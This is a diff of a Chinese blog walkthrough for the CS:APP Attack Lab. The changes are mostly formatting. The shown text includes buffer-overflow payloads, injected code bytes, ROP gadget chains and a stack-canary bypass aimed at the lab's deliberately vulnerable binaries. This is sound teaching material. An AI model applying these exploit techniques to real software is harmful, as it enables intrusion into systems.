@@ -5,7 +5,7 @@ categories:
     - 操作系统
 slug: 从零开始的attack-lab
 hidden: true
-seriesOrder: 3
+seriesOrder: 14
 ---
 # 从零开始的Attack Lab
 
@@ -64,7 +64,7 @@ ROP攻击，全称 **Return-oriented Programming Attack**，即不注入任何�
 
 以下列代码为例：
 
-```
+```bash
 ./hex2raw < p1.txt > ans1.txt # p1.txt是编写的写有十六进制的文件，将其转为二进制文件ans1.txt
 ./ctarget -i ans1.txt # 运行ctarget，让它从ans1.txt中读取输入
 ```
@@ -73,7 +73,7 @@ ROP攻击，全称 **Return-oriented Programming Attack**，即不注入任何�
 
 以下列代码为例：
 
-```
+```bash
 gcc -c p2.s # 编译
 objdump -d p2.o > p2.byte # 翻译为字节码
 ```
@@ -92,7 +92,7 @@ objdump -d p2.o > p2.byte # 翻译为字节码
 ### Phase 1
 首先，运行下列指令，对``ctarget``进行反汇编，得到其汇编码文件:
 
-```
+```bash
 objdump -d ctarget > ctarget.s
 ```
 
@@ -134,7 +134,7 @@ objdump -d ctarget > ctarget.s
 
 画出栈的结构为
 
-```
+```text
 --------------- 64
 | test返回地址 |
 --------------- 56
@@ -150,7 +150,7 @@ objdump -d ctarget > ctarget.s
 
 找到``touch1``的地址为``0x401d36``，于是有答案为
 
-```
+```text
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -161,7 +161,7 @@ objdump -d ctarget > ctarget.s
 
 新建``p1.txt``文件，将上述答案写入，打开终端，运行以下指令：
 
-```
+```bash
 ./hex2raw < p1.txt > ans1.txt
 ./ctarget -i ans1.txt
 ```
@@ -200,7 +200,7 @@ objdump -d ctarget > ctarget.s
 
 运行以下代码：
 
-```
+```bash
 gdb ctarget
 b *(getbuf+8) 
 r // 注意这个Lab没有配置./gdbinit文件，需要手动添加
@@ -222,7 +222,7 @@ ret
 
 将它写入``p2.s``中，并运行以下指令：
 
-```
+```bash
 gcc -c p2.s # 编译
 objdump -d p2.o > p2.byte # 翻译为字节码
 ```
@@ -243,7 +243,7 @@ Disassembly of section .text:
 
 也就是，答案应该如下所示：
 
-```
+```text
 48 c7 c7 61 da a8 23 68 
 6a 1d 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
@@ -254,7 +254,7 @@ d8 4b 66 55
 
 将其写入``p2.txt``，打开终端，运行以下指令：
 
-```
+```bash
 ./hex2raw < p2.txt > ans2.txt
 ./ctarget -i ans2.txt
 ```
@@ -272,8 +272,7 @@ d8 4b 66 55
 
 ```c
 /* Compare string to hex representation of unsigned value */
-int hexmatch(unsigned val, char *sval)
-{
+int hexmatch(unsigned val, char *sval) {
     char cbuf[110];
     /* Make position of check string unpredictable */
     char *s = cbuf + random() % 100;
@@ -281,9 +280,8 @@ int hexmatch(unsigned val, char *sval)
     return strncmp(sval, s, 9) == 0;
 }
 
-void touch3(char *sval)
-{
-    vlevel = 3;      /* Part of validation protocol */
+void touch3(char *sval) {
+    vlevel = 3; /* Part of validation protocol */
     if (hexmatch(cookie, sval)) {
         printf("Touch3!: You called touch3(\"%s\")\n", sval);
         validate(3);
@@ -314,14 +312,14 @@ ret
 
 将它写入``p3.s``中，并运行以下指令：
 
-```
+```bash
 gcc -c p3.s
 objdump -d p3.o > p3.byte 
 ```
 
 将获得的答案写到``p3.txt``中，得到
 
-```
+```text
 48 c7 c7 61 da a8 23 68 
 90 1e 40 00 c3 3f 3f 3f
 3f 3f 3f 3f 3f 3f 3f 3f
@@ -332,7 +330,7 @@ d8 4b 66 55
 
 然后，运行以下代码，观察缓冲区的变化
 
-```
+```bash
 ./hex2raw < p3.txt > p3a.txt 
 gdb ctarget
 b touch3
@@ -362,7 +360,7 @@ ret
 
 重新执行上面的步骤，得到``p3.txt``：
 
-```
+```text
 48 c7 c7 18 4c 66 55 68 
 90 1e 40 00 c3 00 00 00 
 00 00 00 00 00 00 00 00
@@ -376,7 +374,7 @@ d8 4b 66 55 00 00 00 00
 
 打开终端，运行以下指令：
 
-```
+```bash
 ./hex2raw < p3.txt > ans3.txt
 ./ctarget -i ans3.txt
 ```
@@ -388,7 +386,7 @@ d8 4b 66 55 00 00 00 00
 ### Phase 4
 首先，运行下列指令，对``rtarget``进行反汇编，得到其汇编码文件:
 
-```
+```bash
 objdump -d rtarget > rtarget.s
 ```
 
@@ -398,7 +396,7 @@ objdump -d rtarget > rtarget.s
 
 运行下列指令，将``farm.c``转为字节码。
 
-```
+```bash
 gcc -c -Og farm.c # 这里的Og是必须的
 objdump -d farm.o > farm.s
 ```
@@ -441,7 +439,7 @@ f3 0f 1e fa b8 48 89 c7 90 c3
 
 于是，编写汇编代码为：
 
-```
+```asm
 popq %rax 
 ret
 mov %rax,%rdi 
@@ -450,7 +448,7 @@ ret
 
 查找得到``touch2``的地址为``0x401cf8``，结合上面的地址，得到以下答案：
 
-```
+```text
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -464,7 +462,7 @@ f8 1c 40 00 00 00 00 00
 
 将它写入``p4.txt``，打开终端，运行下列指令：
 
-```
+```bash
 ./hex2raw < p4.txt > ans4.txt
 ./rtarget -i ans4.txt
 ```
@@ -508,7 +506,7 @@ f8 1c 40 00 00 00 00 00
 
 下面，由于``writeup``没有给出``leaq (%rdi,%rsi,1),?``的定义，不妨假设``?``为``%rax``(因为前面已经使用过``movq %rax,%rdi``了)，新建文件``p5.s``，写入``leaq (%rdi,%rsi,1),%rax``，运行以下指令：
 
-```
+```bash
 gcc -c p5.s
 objdump -d p5.o > p5.byte
 ```
@@ -521,7 +519,7 @@ objdump -d p5.o > p5.byte
 
 整合一下，编写为答案：
 
-```
+```text
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -544,7 +542,7 @@ cf 1f 40 00 00 00 00 00
 
 将上述答案写入到``p5.txt``：
 
-```
+```text
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -565,7 +563,7 @@ cf 1f 40 00 00 00 00 00
 
 打开终端，运行下列指令：
 
-```
+```bash
 ./hex2raw < p5.txt > ans5.txt
 ./rtarget -i ans5.txt
 ```
@@ -577,7 +575,7 @@ cf 1f 40 00 00 00 00 00
 ### Phase 6
 首先，运行下列指令，对``starget``进行反汇编，得到其汇编码文件:
 
-```
+```bash
 objdump -d starget > starget.s
 ```
 
@@ -587,7 +585,7 @@ objdump -d starget > starget.s
 
 由上面的陈述，先在``starget``中找到所需的``garget``（一个可以偷懒的点是，事实上``starget``中的每个``gadget``只是相对``rtarget``平移了7个字节）：
 
-```
+```text
 e1 1f 40 00 00 00 00 00
 7a 1f 40 00 00 00 00 00
 c4 1f 40 00 00 00 00 00
@@ -662,7 +660,7 @@ void *memcpy(void *str1, const void *str2, size_t n)
 
 要绕开金丝雀值，就需要通过这条``memcpy``指令，将所用的攻击代码，直接复制到返回地址处，画出此时的栈帧，大致如下。
 
-```
+```text
 |  返回地址    |
 --------------- 296
 |  %rbp原值    |
@@ -685,7 +683,7 @@ void *memcpy(void *str1, const void *str2, size_t n)
 
 对过多的部分补零，得到以下答案(注意``小端法``存储)：
 
-```
+```text
 e1 1f 40 00 00 00 00 00
 7a 1f 40 00 00 00 00 00
 c4 1f 40 00 00 00 00 00
@@ -707,7 +705,7 @@ d6 1f 40 00 00 00 00 00
 
 将它写入``p6.txt``中，打开终端，运行以下指令：
 
-```
+```bash
 ./hex2raw < p6.txt > ans6.txt
 ./starget -i ans6.txt
 ```
